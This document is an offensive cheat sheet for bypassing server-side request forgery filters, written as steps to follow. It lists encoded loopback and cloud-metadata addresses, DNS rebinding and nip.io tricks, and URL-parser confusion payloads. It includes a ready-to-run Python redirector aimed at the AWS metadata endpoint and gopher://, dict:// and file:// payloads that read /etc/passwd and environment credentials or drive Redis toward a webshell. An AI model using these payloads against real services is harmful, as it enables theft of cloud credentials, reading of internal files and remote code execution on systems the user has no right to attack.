# SSRF filter bypasses — encodings, DNS tricks, redirects, schemes

Work through these in order of cost whenever the direct payload is blocked.
Identify *what* the filter checks (hostname string? resolved IP? scheme?
first URL only?) from which variants pass — each bypass below defeats a
specific check.

## 1. Alternate representations of the same IP

Defeats string blocklists ("127.0.0.1", "localhost", "169.254"):

```
http://2130706433/            decimal          = 127.0.0.1
http://3232235521/            decimal          = 192.168.0.1
http://2852039166/            decimal          = 169.254.169.254
http://0x7f000001/            hex              = 127.0.0.1
http://0x7f.0x0.0x0.0x1/      dotted hex
http://0177.0.0.1/            octal octet
http://017700000001/          full octal
http://127.1/                 short form       = 127.0.0.1
http://127.0.1/               short form
http://0/                     = 0.0.0.0 → localhost on Linux
http://0.0.0.0/               routes to localhost on Linux
http://[::1]/                 IPv6 loopback
http://[::ffff:127.0.0.1]/    IPv4-mapped IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::]/                  IPv6 any → localhost
http://[fd00:ec2::254]/       AWS IMDS IPv6 address
http://①②⑦.⓪.⓪.①/            unicode digits (some parsers normalize)
```

Mixed radix per octet (`http://0x7f.0.0.01/`) catches regexes expecting
uniform formats. Trailing dot (`127.0.0.1.`) and `%00`/`%0d%0a`/tab/space
suffixes break naive string matching.

## 2. DNS-based

Defeats "hostname must not be an IP / must not match blocklist":

```
http://127.0.0.1.nip.io/          wildcard DNS → 127.0.0.1
http://169.254.169.254.nip.io/
http://metadata.example.com/      your own A record → 169.254.169.254
http://localtest.me/              → 127.0.0.1
```

**DNS rebinding** — defeats resolve-then-validate: serve TTL 0, answer the
validator's lookup with a public IP, answer the fetcher's second lookup with
the internal IP. Run your own authoritative NS (the bundled
`scripts/oob_listener.py` DNS half can be adapted: alternate answers per
query), or any public rebinding service. Needs the client to re-resolve
(separate validation and fetch, or connection-per-request).

## 3. URL-parser confusion

Defeats filters that parse the URL differently from the fetching library:

```
http://api.example.com@169.254.169.254/        userinfo trick — fetch goes to the IP
http://169.254.169.254#api.example.com/        fragment confusion
http://api.example.com.203.0.113.10.nip.io/    allowlisted-substring match
http://203.0.113.10/api.example.com            "contains allowed host" in path
http://api.example.com%2f@169.254.169.254/     encoded slash before @
http://api.example.com\@169.254.169.254/       backslash — browsers vs libcurl disagree
http://1.1.1.1&@2.2.2.2#@3.3.3.3/              multi-@ parser differentials
```

Also: double URL-encoding (`%2531%2536%2539...`), `%09`/`%0a` inside the
authority, uppercase scheme/host (`HTTP://LOCALHOST/`), and `host:+port`
tricks. Test each — the win condition is validator and fetcher disagreeing.

## 4. Redirect chaining

Defeats "validate the submitted URL only". Host a redirector on an allowed/
public host:

```
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
```

Most HTTP clients follow redirects by default and most validators never
re-check the Location. Chain through an **open redirect on the target itself**
(`https://api.example.com/redirect?to=...`) to beat strict same-domain
allowlists. Redirecting to a different *scheme* (`Location: gopher://...`)
works in older libcurl. Minimal stdlib redirector:

```python
# python3 - run on 203.0.113.10:80
from http.server import BaseHTTPRequestHandler, HTTPServer
class R(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
        self.end_headers()
HTTPServer(("0.0.0.0", 80), R).serve_forever()
```

## 5. Scheme abuse

Defeats http(s)-focused filters; capability depends on the fetch library
(libcurl is richest; Java `URL` allows jar:/netdoc:; many SDKs allow file:):

```
file:///etc/passwd                       local file read
file:///proc/self/environ               env vars (often creds)
file://localhost/etc/passwd             bypass "file://" + "///" regexes
dict://127.0.0.1:6379/info              one-line TCP, reads banner/response
gopher://127.0.0.1:6379/_%2a1%0d%0a%244%0d%0aINFO%0d%0a   raw TCP bytes after "_"
gopher://127.0.0.1:25/_HELO%20x%0d%0a...                   SMTP
ldap://127.0.0.1:389/                   banner/port oracle
ftp://127.0.0.1/                        port oracle; curl speaks it
```

gopher:// is the escalation workhorse: craft full protocol exchanges
(URL-encode CRLF as `%0d%0a`) against Redis (`CONFIG SET dir` → webshell,
`SLAVEOF` → module load), memcached, FastCGI (`PHP RCE`), SMTP, and even
HTTP-with-arbitrary-headers (completes GCP/Azure header requirements and the
AWS IMDSv2 PUT).

## 6. Request-smuggling the fetch itself

If the sink reflects the URL into a raw request (naive proxies), inject CRLF:
`?url=http://10.0.0.5/%0d%0aX-Internal: 1%0d%0a` → header injection on the
server-side request; sometimes a full second request.

## 7. Blocklist-gap checklist

When told "internal addresses are blocked", verify each separately — filters
routinely miss: `0.0.0.0`, `0`, `[::]`, `[::1]`, IPv4-mapped IPv6,
link-local `169.254.0.0/16` (not just .169.254), `100.64.0.0/10` (CGNAT —
used by cloud internal services), `198.18.0.0/15`, multicast-mapped,
`metadata.google.internal`, IPv6 unique-local `fd00::/8`, and the
**redirect/rebinding** paths above.

## Deciding what the filter is

| Observation | Filter type | Winning class |
|---|---|---|
| "127.0.0.1" blocked, `http://2130706433/` works | string blocklist | §1 encodings |
| IP literal blocked, hostname fetched | hostname-only check | §2 nip.io / own DNS |
| nip.io blocked, direct public URL OK | resolve-then-check | §2 rebinding, §4 redirect |
| only example.com allowed | allowlist | §3 parser confusion, §4 open redirect on allowed host |
| http OK, file/gopher rejected | scheme allowlist | §4 cross-scheme redirect |
| everything 400s instantly, no OOB | fetch never happens | wrong sink — move on |
